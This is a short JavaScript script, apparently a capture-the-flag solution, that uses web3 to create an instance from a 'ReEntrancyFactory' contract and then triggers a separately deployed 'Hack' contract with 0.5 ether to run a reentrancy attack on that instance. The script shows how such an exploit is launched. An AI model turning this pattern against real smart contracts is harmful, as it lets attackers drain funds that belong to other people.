const fs = require('fs')
const lib = require('../../lib')(require('../../config'))

web3 = lib.web3

async function main () {
    let factory_address = '0x84Fb598A7E8d58715d3C5F2E789570D7B5B0e290'
    let factory = lib.contract(factory_address, JSON.parse(fs.readFileSync('ReEntrancyFactory.abi')))
    let hack_address = '...' // Hack.sol deployed address
    let hack = lib.contract(hack_address, JSON.parse(fs.readFileSync('Hack.abi')))
    let instance_address = await factory.view('instances', hack_address)
    if (instance_address === '0x0000000000000000000000000000000000000000') {
        await hack.call({value: web3.utils.toWei('0.5', 'ether')}, 'create', factory_address)
        instance_address = await factory.view('instances', hack_address)
    }
    console.log(`instance = ${instance_address}`)
    await hack.call({value: web3.utils.toWei('0.5', 'ether')}, 'run', instance_address)
}

main()
